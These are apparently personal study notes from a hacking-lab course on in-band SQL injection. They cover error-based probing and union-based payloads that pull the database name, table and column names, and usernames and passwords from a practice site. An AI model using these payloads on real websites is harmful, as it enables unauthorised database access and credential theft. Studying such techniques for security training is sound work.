---
title: 4.1 In-band SQLi (Classic SQLi)
updated: 2022-11-29T09:18:40.0000000+04:00
created: 2022-11-28T09:33:53.0000000+04:00
---

4.1 In-band SQLi (Classic SQLi)
Monday, November 28, 2022
9:33 AM
The most common SQL injection attack is known as in-band SQL injection,

- **happens when the attacker is able to utilize the same parameter and channel to start an attack and receive the desired results**.
- **For Example:** discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.
- In-band SQLi is mostly split into two types:

**<u>Error-based SQLi</u>**
- error messages are returned as a response from the database and allow the attacker to gain information about the backend database itself.
- In certain scenarios, error-based SQLi in itself is essential for an attacker to gain access to the backend database; **this is why errors should be disabled in all cases.**

**<u>How to Discover:</u>**

The key to discovering error-based SQL Injection
- break the code's SQL query by
- trying certain characters until an error message is produced;
- these are most commonly single apostrophes **( ' )** or a quotation mark ( " ).

1.  **<u>Example 1 (Simple)</u>**

- **try adding a (') after lets say id=1**

[https://website.thm/article?id=1**'**](https://website.thm/article?id=1')

- It may produce and error
- This will prove the website can be vulnerable to SQLi attacks

**<u>Union-based SQLi</u>**
- Utilizes the SQL operator (union) to concatenate responses of two SQL statements into a single response.

1.  **<u>Example 1:</u>**

- The first thing we need to do is return data to the browser without displaying an error message.
- Firstly we'll try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browsers id parameter to: **1 union select 1**

- <https://website.thm/article?id=1>

- <https://website.thm/article?id=1> union select 1

- If produces an error you can continue by adding: **1 union select 1,2**

- <https://website.thm/article?id=1> union select 1,2

- Moreover, if it still produces errors you can add additional numbers: **1 union select 1,2,3**
- <https://website.thm/article?id=1> union select 1,2,3

2.  **<u>Example 2: Displaying own data</u>**

1.  Once it no longer shows the error messages and displays the article or post, it means you have succeeded.
2.  Now we want to display our own data instead of the article.
3.  The article is being displayed because it is using the id=1
4.  To get around that we need to simply change the id from 1 to 0

- <https://website.thm/article?id=0> union select 1,2,3

5.  The article will end up displaying along with the values returned from the SQL statement of values 1,2 and 3.
6.  We can then use these values to retrieve additional useful information.

3.  **<u>Example 3: Getting the Database Name:</u>**

1.  Simply interchange one of the values from the SQL parameter as seen below
- <https://website.thm/article?id=0> union select 1,2,database()

![image1](image1-182.png)

2.  You can see where the value 3 was previously displayed, it is now showing the database name: sqli_one

4.  **<u>Example 4: Getting Tables from the Database Name</u>**
5.  The next query will gather a list of table that are in this database
- 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

- <https://website.thm/article?id=0> UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

6.  From the Above, the following parameters are defined as followed:
- **Group_concat()** = gets the specified column
- **Information_schema** = every user has access to this, contains information about all the database and tables the user has access to

5.  **<u>Example 5: Getting Column information from the Table</u>**

1.  Use the **information_schema** to find the structure of the table using the following query;
- 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
2.  The query will provide results for the staff_users table: **id, password; username**

6.  **<u>Example 6: Getting the Password from the Database:</u>**

- 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '\<br\>') FROM staff_users

7.  Again we use the group_concat method to return all of the rows into one string and to make it easier to read.
8.  We've also added ,':', to split the username and password from each other.
9.  Instead of being separated by a comma, we've chosen the HTML \<br\> tag that forces each result to be on a separate line to make for easier reading.

.
